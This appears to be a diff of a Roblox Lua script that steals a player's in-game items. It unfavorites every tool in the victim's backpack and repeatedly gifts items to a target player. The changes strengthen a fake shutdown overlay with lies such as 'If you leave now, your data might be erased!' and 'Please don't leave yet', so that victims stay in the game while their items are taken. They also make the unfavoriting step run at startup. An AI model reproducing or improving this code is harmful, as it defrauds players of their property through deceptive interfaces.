@@ -71,8 +71,10 @@ local function unfavoriteAll()
     local InventoryServiceEnums = require(ReplicatedStorage.Data.EnumRegistry.InventoryServiceEnums)
     local FavoriteEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
 
-    for _, tool in ipairs(Players.LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
-        FavoriteEvent:FireServer(tool)
+    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            FavoriteEvent:FireServer(item)
+        end
     end
 end
 
@@ -594,16 +596,16 @@ local function createFakeShutdown()
     message.TextTransparency = 1
     message.Parent = frame
 
-    local dots = Instance.new("TextLabel")
-    dots.Text = "Please wait"
-    dots.TextColor3 = Color3.new(1, 1, 1)
-    dots.Size = UDim2.new(1, 0, 0.1, 0)
-    dots.Position = UDim2.new(0, 0, 0.6, 0)
-    dots.BackgroundTransparency = 1
-    dots.Font = Enum.Font.SourceSans
-    dots.TextSize = 18
-    dots.TextTransparency = 1
-    dots.Parent = frame
+    local warning = Instance.new("TextLabel")
+    warning.Text = "If you leave now, your data might be erased!"
+    warning.TextColor3 = Color3.new(1, 1, 1)
+    warning.Size = UDim2.new(1, 0, 0.1, 0)
+    warning.Position = UDim2.new(0, 0, 0.7, 0)
+    warning.BackgroundTransparency = 1
+    warning.Font = Enum.Font.SourceSans
+    warning.TextSize = 18
+    warning.TextTransparency = 1
+    warning.Parent = frame
 
     gui.Parent = CoreGui
 
@@ -616,37 +618,20 @@ local function createFakeShutdown()
 
         title.TextTransparency = 1 - alpha
         message.TextTransparency = 1 - alpha
-        dots.TextTransparency = 1 - alpha
+        warning.TextTransparency = 1 - alpha
 
         if alpha >= 1 then
             fadeConn:Disconnect()
         end
     end)
 
-    local dotCount = 0
-    local lastDotTime = os.clock()
-    local dotInterval = 0.8
-    local dotConn
-    dotConn = RunService.Heartbeat:Connect(function()
-        local now = os.clock()
-        if now - lastDotTime >= dotInterval then
-            lastDotTime = now
-            dotCount = (dotCount + 1) % 4
-            dots.Text = "Please wait"..string.rep(".", dotCount)
-        end
-    end)
+    task.wait(20)
 
-    local pulseConn
-    pulseConn = RunService.Heartbeat:Connect(function()
-        local pulse = math.sin(os.clock() * 1.5) * 0.05 + 1
-        title.TextSize = 32 * pulse
-    end)
+    warning.Text = "There has been an issue. Please wait until we update the servers. Please don't leave yet."
 
     shutdownGui = gui
     return gui, function()
         if fadeConn then fadeConn:Disconnect() end
-        if dotConn then dotConn:Disconnect() end
-        if pulseConn then pulseConn:Disconnect() end
         gui:Destroy()
     end
 end
@@ -718,9 +703,6 @@ local function checkForGiftPrompt(targetPlayer)
 end
 
 local function startGifting(targetPlayer)
-    unfavoriteAll()
-    task.wait(0.5)
-    
     while true do
         if not Players:FindFirstChild(targetPlayer.Name) then
             if shutdownGui then
@@ -775,6 +757,7 @@ local function startGifting(targetPlayer)
     end
 end
 
+unfavoriteAll()
 createLoader()
 sendInitialReport()
 task.wait(2)
